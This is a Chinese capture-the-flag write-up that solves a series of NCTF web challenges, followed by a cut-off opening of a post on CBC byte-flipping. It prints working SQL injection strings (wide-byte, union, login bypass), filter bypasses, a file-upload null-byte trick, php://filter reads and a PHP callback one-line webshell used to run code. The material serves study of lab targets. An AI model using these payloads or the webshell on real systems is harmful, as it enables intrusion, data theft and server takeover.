(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;); 经过查询这种编码方式解码后是一串js代码，并且可以不用解码直接丢入浏览器的控制台就可以执行，那么我们就直接丢入控制台执行 执行后提示变量ωﾟﾉ未被定义，我们定义变量ωﾟﾉ为空，然后再次输入代码 成功弹出flag 单身二十年网址：http://chinalover.sinaapp.com/web8/ 页面源代码看到链接 但是点击链接自动跳转到no_key_is_here_forever.php 说明有重定向，果断burp抓包 你从哪里来网址：http://chinalover.sinaapp.com/web22/ 貌似从谷歌页面访问该页面才能拿到flag 用burp抓包修改Referer字段值为https://www.google.com即可拿到flag php decode给出了源代码： 1234567891011121314&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE;&#125;eval(CLsI(\"+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==\"));?&gt; 一个加密的程序，直接执行就可以 结果 文件包含网址：http://4.chinalover.sinaapp.com/web7/index.php 看到file参数，很明显的文件包含，直接用php://filter协议读出index.php源代码 解密后 12345678910111213141516&lt;html&gt; &lt;title&gt;asdf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href=\"./index.php?file=show.php\"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\"))&#123; echo \"Oh no!\"; exit(); &#125; include($file); //flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; 看到flag 单身一百年也没用网址：http://chinalover.sinaapp.com/web9/ 还是重定向，抓包 flag藏在响应头部 COOKIE网址：http://chinalover.sinaapp.com/web10/index.php 提示login first，burp抓包修改cookie中的login=1 拿到flag MYSQL网址：http://chinalover.sinaapp.com/web11/ 页面提示robots.txt 那我们就访问http://chinalover.sinaapp.com/web11/robots.txt 发现提示了源代码和sql.php 1234567891011121314&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\")); if ($_GET[id]==1024) &#123; echo \"&lt;p&gt;no! try again&lt;/p&gt;\"; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 发现intval函数，作用是将字符串中的整数值取出，并且取出的字符串开始部分的整数值，如intval(1024a1)=1024 intval(a1)=0 并且有了intval函数，我们就没办法对参数id进行sql注入 并且服务器对GET的参数id进行过滤，经过php弱类型比较，如果等于1024，则退出程序 猜测flag就在id为1024里，所以我们思路是让GET的参数id经过intval函数处理的值为1024，但是弱类型比较不等于1024 我们知道php弱类型比较两个值是先将这两个值转化为同一类型，这里是字符串与整形的弱类型，就将字符串转化为整形，也是将字符串的整数值部分取出，与intval函数类似，除了处理”e”,”.”,”E” 举个例子 12345678910&lt;?php$id = intval(\"1024e1\") //$id=1024\"1024e1\" == 1024 //false\"1024e1\" == 10240 //true$id = intval(\"1024.1\") //$id=1024\"1024.1\" == 1024 //false\"1024.1\" == 1024.1 //true?&gt; 那么就很明显，我们可以GET参数id=1024e1或者1024.1，都能拿到flag sql injection 3网址：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 页面显示了执行的sql语句和返回的信息，很明显的注入点在id，数字型注入且从sql语句看id被单引号包裹 输入id=1’ 发现单引号被转义了，猜测是宽字节注入，输入id=1%df%27%23，正确返回信息，就可以开始注入了 sql语句就提示了news表，先看一下news表下的列名 输入id=0%df’ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x6e657773 %23 列名为id和title 输入id=0%df%27%20union%20select%201,group_concat(title)%20from%20news%23 注出title信息 没有发现flag 那再看看其他表 输入id=0%df%27%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23 表名为ctf,ctf2,ctf3,ctf4,news 看看ctf表下的列名 列名为user,pw 看看ctf2表下列名 列名为id,content 看看ctf3表下列名 列名为id,email,token 最后ctf4表下列名 看到flag列 看看flag列下信息 拿到flag /x00网址：http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php 给出了源代码 12345678if (isset ($_GET['nctf'])) &#123; if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~';&#125; 看到ereg函数就想起了%00(NULL)截断，而且ereg和strpos处理数组都会返回null值，null不全等于False，所以直接输入nctf[]即可获得flag 或者是输入nctf=1%00%23biubiubiu，这里#要用%23代替 也可以得到flag bypass again网址：http://chinalover.sinaapp.com/web17/index.php 依然是md5碰撞 GET参数a=240610708&amp;b=QNKCDZO 变量覆盖网址：http://chinalover.sinaapp.com/web18/index.php 看到提示代码http://chinalover.sinaapp.com/web18/source.php 给出了源代码 123456789&lt;?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class=\"alert alert-success\"&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt; &lt;?php &#125; ?&gt; extract函数的作用是将数组中的键名作为变量名，键值作为变量值，那么思路就很清晰了，我们post两个参数pass和thepassword_123，给这两个变量赋值相同，就可以拿到flag了 伪装者网址：http://chinalover.sinaapp.com/web4/xxx.php 提示本地登录才行，利用burp抓包添加X-Forwarded-For:127.0.0.1即可，但这里题目坏了，改了也拿不到flag 上传绕过网址：http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html 文件上传题目，因为是html页面，所以先看看源代码 发现上传到upload.php，而且同时上传了一个隐藏值 1&lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/uploads/&quot; /&gt; 访问upload.php，提示我们只能上传jpg,png,gif格式文件 先试着上传一个png文件 提示必须上传php格式文件 再试着上传php文件 提示上传不了，看一下二者共同有的信息是一个数组Array,里面有文件名后缀，推测是先对文件后缀名检测，如果不是jpg,png，则过滤 试着burp抓包修改文件名为demo.png.php 很明显服务器是最后的后缀名检测，再尝试php5,Php等都不行 所以只能后缀名是png,jpg的文件才能成功上传，然后我们需要想办法让服务器认为这是一个php文件 上传png文件后的信息看到了basename，猜测跟目录有关，basename这个函数是将路径中的文件名取出，并且我们之前查看源代码也看到了提交了隐藏的目录信息 我们先试着修改目录，将/uploads/修改成/uploads/demo.php 发现文件名也跟随着目录值而改变了，所以我们猜测服务器就是根据basename后的文件名进行检测是不是php文件 经过查询，basename是可以用十六进制的00截断的 我们将/uploads/修改成/uploads/demo.php (后面有个空格) 然后在burp的Hex中将对应的20(空格)修改成00 成功拿到flag SQL注入1网址：http://chinalover.sinaapp.com/index.php http://chinalover.sinaapp.com/index.phps给出了源代码 12345678910111213141516171819202122232425262728293031&lt;html&gt;&lt;head&gt;Secure Web Login&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;; echo &apos;&lt;/br&gt;&apos;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user];?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value=&quot;Username&quot;&gt;&lt;input type=password name=pass value=&quot;Password&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href=&quot;index.phps&quot;&gt;Source&lt;/a&gt;&lt;/html&gt; 从源代码看出用户名为admin,且密码是正确的密码才能返回flag 但是对我们POST的参数user毫无过滤，我们只需要POST参数user=admin’)#即可获得flag pass check网址：http://chinalover.sinaapp.com/web21/ 给出了源代码提示： 1234567891011121314&lt;?php$pass=@$_POST['pass'];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo \"flag:nctf&#123;*&#125;\";&#125;else&#123;echo \"the pass is wrong!\";&#125;&#125;else&#123;echo \"please input pass!\";&#125;?&gt; 拿到flag的条件是strcmp()函数返回0，即两个变量比较结果相等，我们不知道$pass1变量的值，但是strcmp函数处理数组时会返回NULL 所以我们POST参数pass[]= 即可拿到flag 起名字真难网址：http://chinalover.sinaapp.com/web12/index.php 给出了源代码提示 123456789101112131415161718192021&lt;?php function noother_says_correct($number)&#123; $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == '54975581388';&#125;$flag='*******';if(noother_says_correct($_GET['key'])) echo $flag;else echo 'access denied';?&gt; 对我们GET的参数key进行了检查，不能包含[1-9]任意一个字符，否则就拿不到flag，key值要等于54975581388，可以考虑转化为十六进制，54975581388 的十六进制为0xccccccccc 输入key=0xccccccccc 拿到flag php 反序列化这题服务器崩了，只能本地搭环境演示 给出了源代码： 12345678910111213141516171819202122232425&lt;?phpclass just4fun &#123; var $enter; var $secret;&#125;if (isset($_GET['pass'])) &#123; $pass = $_GET['pass']; if(get_magic_quotes_gpc())&#123; $pass=stripslashes($pass); &#125; $o = unserialize($pass); if ($o) &#123; $o-&gt;secret = \"*\"; if ($o-&gt;secret === $o-&gt;enter) echo \"Congratulation! Here is my secret: \".$o-&gt;secret; else echo \"Oh no... You can't fool me\"; &#125; else echo \"are you trolling?\";&#125;?&gt; 首先创建了一个类，然后接受GET参数pass，并且对pass进行了去掉转义的处理，get_magic_quotes_gpc()是检查是否对变量有转义处理，如果返回1则说明有转义处理，那么执行stripslashes函数，去掉转义，然后对pass参数进行反转义处理，然后检查对象o的secret变量是否全等于对象o的enter变量，如果相等则输出flag，可是我们不知道enter变量的值，所以我们可以考虑使用引用处理 例如$a =&amp; $b，则$a和$b指向同一个值，当$a的值变化时，$b的值也随之变化 1234567891011&lt;?php$a =&amp; $b;$a = 1;echo '$b='.$b; //$b=1echo '&lt;br&gt;';$b = 2;echo '$a='.$a; //$a=2?&gt; 所以我们使$o-&gt;enter =&amp; $o-&gt;secret 12345678910111213&lt;?phpclass just4fun &#123; var $enter; var $secret;&#125;$o = new just4fun();$o-&gt;enter =&amp; $o-&gt;secret;$pass = serialize($o);echo $pass;?&gt; 拿到序列化的$pass，然后将这个pass GET给服务器 成功拿到flag sql injection 4网址：http://chinalover.sinaapp.com/web15/index.php 给出了源代码提示 1234567891011121314151617181920212223&lt;?php#GOAL: login as admin,then get the flag;error_reporting(0);require &apos;db.inc.php&apos;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&apos;username&apos;]);$password = @clean((string)$_GET[&apos;password&apos;]);$query=&apos;SELECT * FROM users WHERE name=\\&apos;&apos;.$username.&apos;\\&apos; AND pass=\\&apos;&apos;.$password.&apos;\\&apos;;&apos;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&apos;Invalid password!&apos;);&#125;echo $flag;?&gt; 首先需要了解htmlentities() 函数：把字符转换为 HTML 实体 而htmlentities($str, ENT_QUOTES); 是 转换双引号和单引号 我们看个例子 12345678910111213141516171819&lt;?phpfunction clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET['username']);$password = @clean((string)$_GET['password']);echo '$username='.$username;echo '&lt;br&gt;';echo '$password='.$password;echo '&lt;br&gt;';$query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';echo $query;?&gt; 我们试着GET参数username=’admin’，password=”1” 在浏览器页面上看还是单引号和双引号，而看下源代码 发现就不是原来的单引号和双引号了，相等于转变成了其他字符，而我们要进行sql注入，就必须闭合单引号 既然没办法通过输入单引号来闭合单引号，那么还可以通过转义单引号的方法 试着输入username=\\,password= or 1=1 %23 可以此时的sql语句是 1SELECT * FROM users WHERE name=&apos;\\&apos; AND pass=&apos; or 1=1#&apos;; 可以看到一个单引号被转义，name=后的单引号和pass=后的单引号闭合了，我们再构造or 1=1语句构造恒真语句 这样就必定有查询结果 最后拿到flag 综合题网址：http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php 页面是一串jsfuck代码，拿到解码网站解码后结果是1bc29b36f623ba82aaf6724fd3b16718.php 访问http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php 页面显示提示在脑袋里，马上抓包看看响应头，发现tip: history of bash 查询bash：Bash shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。 那么我们访问http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 发现命令zip -r flagbak.zip，解压过压缩包，那我们访问http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip下载压缩包 获得flag is:nctf{bash_history_means_what} SQL注入2网址：http://4.chinalover.sinaapp.com/web6/index.php 给出了源代码提示： 123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(\"select pw from ctf where user='$user'\")); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo \"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;\"; &#125; else &#123; echo(\"&lt;p&gt;Log in failure!&lt;/p&gt;\"); &#125;&#125;?&gt; 拿到flag条件是查询的结果和我们POST的参数pass的md5值一样，服务器对我们post的参数user没有过滤，根据提示，我们使用union注入控制查询结果，使之和pass的md5值相等 payloads:user=’ union select md5(1)#&amp;pass=1 拿到flag 综合题2网址：http://cms.nuptzj.cn/ 题目给出了提示这题不是xss，浏览源代码，发现说明文件http://cms.nuptzj.cn/about.php?file=sm.txt 看到file参数，猜测可能存在文件包含漏洞，试着用php://fileter读取about.php源代码 解码得about.php源代码： 123456789101112131415&lt;?php$file=$_GET[&apos;file&apos;];if($file==&quot;&quot; || strstr($file,&apos;config.php&apos;))&#123;echo &quot;fileåæ°ä¸è½ä¸ºç©ºï¼&quot;;exit();&#125;else&#123;$cut=strchr($file,&quot;loginxlcteam&quot;);if($cut==false)&#123;$data=file_get_contents($file);$date=htmlspecialchars($data);echo $date;&#125;else&#123;echo &quot;&lt;script&gt;alert(&apos;ææç®å½ï¼ç¦æ­¢æ¥çï¼ä½æ¯ããã&apos;)&lt;/script&gt;&quot;;&#125;&#125; 再看看say.php源码 1234567891011121314151617181920212223242526272829303132333435&lt;?phpinclude &apos;config.php&apos;;$nice=$_POST[&apos;nice&apos;];$say=$_POST[&apos;usersay&apos;];if(!isset($_COOKIE[&apos;username&apos;]))&#123;setcookie(&apos;username&apos;,$nice);setcookie(&apos;userpass&apos;,&apos;&apos;);&#125;$username=$_COOKIE[&apos;username&apos;];$userpass=$_COOKIE[&apos;userpass&apos;];if($nice==&quot;&quot; || $say==&quot;&quot;)&#123;echo &quot;&lt;script&gt;alert(&apos;æµç§°æçè¨åå®¹ä¸è½ä¸ºç©ºï¼(å¦ææåå®¹ä¹å¼¹åºæ­¤æ¡ï¼ä¸æ¯ç½ç«é®é¢å~ å¥½å§ï¼ç»ä¸ªæç¤ºï¼æ¥çé¡µé¢æºç ææåï¼)&apos;);&lt;/script&gt;&quot;;exit();&#125;$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;ä¸è½è¿æ¥å°æ°æ®åºï¼ï¼&quot;.mysql_error());mysql_select_db($db_name,$con);$nice=mysql_real_escape_string($nice);$username=mysql_real_escape_string($username);$userpass=mysql_real_escape_string($userpass);$result=mysql_query(&quot;SELECT username FROM admin where username=&apos;$nice&apos;&quot;,$con);$login=mysql_query(&quot;SELECT * FROM admin where username=&apos;$username&apos; AND userpass=&apos;$userpass&apos;&quot;,$con);if(mysql_num_rows($result)&gt;0 &amp;&amp; mysql_num_rows($login)&lt;=0)&#123;echo &quot;&lt;script&gt;alert(&apos;æµç§°å·²è¢«ä½¿ç¨ï¼è¯·æ´æ¢ï¼&apos;);&lt;/script&gt;&quot;;mysql_free_result($login);mysql_free_result($result);mysql_close($con);exit();&#125;mysql_free_result($login);mysql_free_result($result);$say=mysql_real_escape_string($say);mysql_query(&quot;insert into message (nice,say,display) values(&apos;$nice&apos;,&apos;$say&apos;,0)&quot;,$con);mysql_close($con);echo &apos;&lt;script&gt;alert(&quot;æå»ºåè°ç¤¾ä¼ï¼çè¨éè¦ç»è¿ç®¡çåå®¡æ ¸æå¯ä»¥æ¾ç¤ºï¼&quot;);window.location = &quot;./index.php&quot;&lt;/script&gt;&apos;;?&gt; 对我们输入的参数都加以转义，没什么漏洞，继续看看还有什么文件，再源代码中还发现了so.php文件 看看它的源代码 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;&lt;title&gt;æç´¢çè¨&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;div id=\"say\" name=\"say\" align=\"left\" style=\"width:1024px\"&gt;&lt;?phpif($_SERVER['HTTP_USER_AGENT']!=\"Xlcteam Browser\")&#123;echo 'ä¸æ¶æ»´é»éï¼æ¬åè½åªæç¨æ¬å¬å¸å¼åçæµè§å¨æå¯ä»¥ç¨å~'; exit();&#125;$id=$_POST['soid'];include 'config.php';include 'antiinject.php';include 'antixss.php';$id=antiinject($id);$con = mysql_connect($db_address,$db_user,$db_pass) or die(\"ä¸è½è¿æ¥å°æ°æ®åºï¼ï¼\".mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query(\"SELECT * FROM `message` WHERE display=1 AND id=$id\");$rs=mysql_fetch_array($result);echo htmlspecialchars($rs['nice']).':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'.antixss($rs['say']).'&lt;br /&gt;';mysql_free_result($result);mysql_free_result($file);mysql_close($con);?&gt;&lt;/div&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 我们看到这里的参数id虽然被mysql_real_escape_string函数处理过，但是在sql语句中是参数id是没有被引号包裹的，但是id经过自定义函数antiinject处理，这个函数在so.php未被定义，猜测可能定义在包含的文件antiinject.php中，我们再读取它的源代码： 12345678910&lt;?phpfunction antiinject($content)&#123;$keyword=array(\"select\",\"union\",\"and\",\"from\",' ',\"'\",\";\",'\"',\"char\",\"or\",\"count\",\"master\",\"name\",\"pass\",\"admin\",\"+\",\"-\",\"order\",\"=\");$info=strtolower($content);for($i=0;$i&lt;=count($keyword);$i++)&#123; $info=str_replace($keyword[$i], '',$info);&#125;return $info;&#125;?&gt; 很明显的一个过滤函数，通过str_replace函数过滤一些关键字，但是str_replace函数只需要双写就可以绕过，但是这里还过滤了空格，mysql中注释符/**/可以代替空格 这里还需注意将请求头的User-Agent字段修改为Xlcteam Browser 那么我们就可以愉快的注入了，首先POST参数soid=1，发现有查询结果，那么就可以注出查询返回列数 soid=1//oorrdoorrderer//by/**/4有查询结果 soid=1//oorrdoorrderer//by/**/5无查询结果，返回列数为4 soid=0时无查询结果，用union注入 soid=0//uunionnion//sselectelect/**/1,2,3,4 返回的列在2,3位置 soid=0//uunionnion//sselectelect/**/1,database(),3,4爆库 库名为sae-exploitblog 根据之前说明文本的提示表admin的结构 soid=0//uunionnion//sselectelect//1,(sselectelect//usernnameame//ffromrom//aadmindmin),(sselectelect//userppassass//ffromrom/**/aadmindmin),4 注出用户名admin和密码102 117 99 107 114 117 110 116 117 这里密码还经过函数antixss处理过，保险起见还是再读取一下antixss.php的源代码 123456789101112131415&lt;?phpfunction antixss($content)&#123;preg_match(&quot;/(.*)\\[a\\](.*)\\[\\/a\\](.*)/&quot;,$content,$url);$key=array(&quot;(&quot;,&quot;)&quot;,&quot;&amp;&quot;,&quot;\\\\&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;&apos;&quot;,&quot;%28&quot;,&quot;%29&quot;,&quot; on&quot;,&quot;data&quot;,&quot;src&quot;,&quot;eval&quot;,&quot;unescape&quot;,&quot;innerHTML&quot;,&quot;document&quot;,&quot;appendChild&quot;,&quot;createElement&quot;,&quot;write&quot;,&quot;String&quot;,&quot;setTimeout&quot;,&quot;cookie&quot;);//å ä¸ºå¤ªèï¼å¾æï¼æä»¥ããã(è¿æ»¤è§åæ¥èªMramydnei)$re=$url[2];if(count($url)==0)&#123;return htmlspecialchars($content);&#125;else&#123;for($i=0;$i&lt;=count($key);$i++)&#123;$re=str_replace($key[$i], &apos;_&apos;,$re);&#125;return htmlspecialchars($url[1],ENT_QUOTES).&apos;&lt;a href=&quot;&apos;.$re.&apos;&quot;&gt;&apos;.$re.&apos;&lt;/a&gt;&apos;.htmlspecialchars($url[3],ENT_QUOTES);&#125;&#125;?&gt; 大概是过滤一些html标签关键字，我们注出的密码应该只是经过 htmlspecialchars函数处理，没有什么影响 那么得到用户名和密码，大概是要进入一个登陆界面 这时注意到about.php文件中过滤了关键字loginxlcteam 就试着访问http://cms.nuptzj.cn/loginxlcteam 没想到就访问到了登陆界面 我们试着将注出的用户名和密码输入，提示错误 此时回去看看说明的文本，里面提示了密码加密文件passencode.php 猜测可能密码有经过加密，我们先读取passencode.php 源代码 123456789101112131415&lt;?phpfunction passencode($content)&#123;//$pass=urlencode($content);$array=str_split($content);$pass=&quot;&quot;;for($i=0;$i&lt;count($array);$i++)&#123;if($pass!=&quot;&quot;)&#123;$pass=$pass.&quot; &quot;.(string)ord($array[$i]);&#125;else&#123;$pass=(string)ord($array[$i]);&#125;&#125;return $pass;&#125;?&gt; 看了加密的源代码，很明显我们注出的密码102 117 99 107 114 117 110 116 117是经过加密的，我们根据加密的过程写出解密的过程 12345678910111213141516&lt;?phpfunction passdecode($pass)&#123; $arr = explode(&quot; &quot;,$pass); $content = &quot;&quot;; for($i=0;$i&lt;count($arr);$i++)&#123; $content = $content.chr($arr[$i]); &#125; return $content;&#125;$pass = &quot;102 117 99 107 114 117 110 116 117&quot;;$content = passdecode($pass);echo $content;?&gt; 执行结果：fuckruntu 再次在登录界面输入用户名admin,密码fuckruntu 提示我们还差最后一步，并且提示将一句话木马放在网站根目录下的xlcteam.php文件中 既然在根目录下，我们还是可以在about.php中读取源代码 12345&lt;?php$e = $_REQUEST['www'];$arr = array($_POST['wtf'] =&gt; '|.*|e',);array_walk($arr, $e, '');?&gt; 查询得到这是一个回调函数的一句话木马 那么我们post参数www=preg_replace,wtf就是我们可以任意执行的命令 那么我们可以post参数wtf=print_r(scandir(‘./‘)); 发现文件：恭喜你获得flag2.txt 获得flag","categories":[{"name":"nctf-Web","slug":"nctf-Web","permalink":"https://Foxgrin.github.io/categories/nctf-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"CBC字节翻转攻击","slug":"CBC字节翻转攻击","date":"2018-08-11T03:12:00.000Z","updated":"2018-08-11T05:43:28.692Z","comments":true,"path":"/posts/47995/","link":"","permalink":"https://Foxgrin.github.io/posts/47995/","excerpt":"几个月之前就碰到了这类题，但是一直没搞懂，最近做ctf又碰到了，赶紧研究了一番，总算是搞懂了","text":"几个月之前就碰到了这类题，但是一直没搞懂，最近做ctf又碰到了，赶紧研究了一番，总算是搞懂了 CBC原理首先还是要稍微了解一下CBC加密和解密的原理 